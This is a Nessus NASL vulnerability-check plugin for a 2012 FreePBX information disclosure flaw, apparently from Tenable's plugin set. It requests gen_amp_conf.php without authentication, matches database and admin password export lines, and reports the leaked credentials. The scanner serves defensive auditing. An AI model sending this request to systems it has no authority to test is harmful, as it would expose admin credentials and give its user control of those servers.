#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(58088);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2016/10/10 15:57:05 $");

  script_bugtraq_id(52048);

  script_name(english:"FreePBX gen_amp_conf.php Information Disclosure");
  script_summary(english:"Tries to get admin password by requesting gen_amp_conf.php.");

  script_set_attribute(attribute:"synopsis", value:
"A web application on the remote host is affected by an information
disclosure vulnerability.");
  script_set_attribute(attribute:"description", value:
"By requesting the 'admin/modules/framework/bin/gen_amp_conf.php'
script directly, an unauthenticated, remote attacker can discover all
the configuration parameters, including the admin password, for the
FreePBX installed on the remote host, thereby gaining administrative
access to it.");
  # https://web.archive.org/web/20120218031427/http://linuxsecurityblog.com/2012/02/freepbx-vulnerable
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?36cd0cc3");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2012/Feb/75");
  # https://web.archive.org/web/20120228093111/http://www.freepbx.org/forum/freepbx/development/security-gen-amp-conf-php
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?8af42c16");
  script_set_attribute(attribute:"solution", value:
"Upgrade FreePBX to version 2.9.0 or later, with the most up-to-date
core and framework modules.

Alternatively, update the Apache configuration on the server to
prevent remote access to the affected script.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/02/14");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/02/22");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:freepbx:freepbx");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2016 Tenable Network Security, Inc.");

  script_dependencies("freepbx_detect.nasl");
  script_require_keys("www/PHP", "installed_sw/FreePBX");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");


app = 'FreePBX';
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port,qs:dir);

url = '/admin/modules/framework/bin/gen_amp_conf.php';
res = http_send_recv3(method:"GET", item:dir+url, port:port, exit_on_fail:TRUE);

if (
  egrep(pattern:"export (AMPDBUSER|AMPMGRUSER|ARI_ADMIN_USERNAME)=.", string:res[2]) &&
  egrep(pattern:"export (AMPDBPASS|AMPMGRPASS|ARI_ADMIN_PASSWORD|FOPPASSWORD)=.", string:res[2])
)
{
  security_report_v4(
    port        : port,
    severity    : SECURITY_HOLE,
    generic     : TRUE,
    request     : make_list(install_url + url),
    output      : chomp(res[2])
  );
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
